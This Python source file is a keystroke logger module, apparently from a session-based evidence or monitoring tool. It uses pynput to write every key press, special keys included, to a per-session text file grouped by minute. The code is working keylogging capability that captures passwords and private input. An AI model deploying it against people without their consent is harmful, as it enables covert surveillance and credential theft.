"""
Keystroke Logger Module
Records all keyboard input organized by minute
"""
import threading
from datetime import datetime
from pathlib import Path
from pynput import keyboard
from typing import Optional
from event_bus import Event, event_bus
from config import config
from database import EvidenceDatabase


class KeyboardModule:
    """Keystroke logging module"""
    
    def __init__(self, session_dir: Path, db: EvidenceDatabase, session_id: str):
        self.session_dir = session_dir
        self.db = db
        self.session_id = session_id
        self._keylog_path = session_dir / "keystrokes.txt"
        self._running = False
        self._stop_event = threading.Event()
        self._last_minute = [None]
        self._listener: Optional[keyboard.Listener] = None
        
        self._special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: "[⌫]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[↑]",
            keyboard.Key.down: "[↓]",
            keyboard.Key.left: "[←]",
            keyboard.Key.right: "[→]",
        }
    
    def _on_press(self, key) -> Optional[bool]:
        """Handle key press events"""
        if self._stop_event.is_set():
            return False  # Stop listener
        
        minute = datetime.now().strftime("%Y-%m-%d %H:%M")
        header = f"\n── {minute} ──\n" if minute != self._last_minute[0] else ""
        self._last_minute[0] = minute
        
        try:
            char = key.char or ""
        except AttributeError:
            char = self._special_keys.get(key, f"[{key.name.upper()}]")
        
        if char:
            self._write_keystrokes(header + char)
        
        return True  # Continue listening
    
    def _write_keystrokes(self, text: str) -> None:
        """Write keystrokes to file"""
        try:
            with open(self._keylog_path, "a", encoding="utf-8") as f:
                f.write(text)
        except Exception as e:
            event_bus.publish(Event(
                event_type="KEYSTROKE_ERROR",
                priority="INFO",
                detail=str(e),
                source="keyboard"
            ))
    
    def start(self) -> None:
        """Start keyboard listener"""
        if not config.modules.get("keystrokes", True):
            event_bus.publish(Event(
                event_type="KEYSTROKE_SKIP",
                priority="INFO",
                detail="Keystroke logging disabled in config",
                source="keyboard"
            ))
            return
        
        self._running = True
        self._stop_event.clear()
        
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()
        
        event_bus.publish(Event(
            event_type="KEYSTROKE_START",
            priority="INFO",
            detail="Keyboard listener started",
            source="keyboard"
        ))
    
    def stop(self) -> None:
        """Stop keyboard listener"""
        self._running = False
        self._stop_event.set()
        
        if self._listener:
            self._listener.stop()
            self._listener.join()
    
    def get_size(self) -> int:
        """Get size of keystroke log file"""
        try:
            return self._keylog_path.stat().st_size
        except Exception:
            return 0
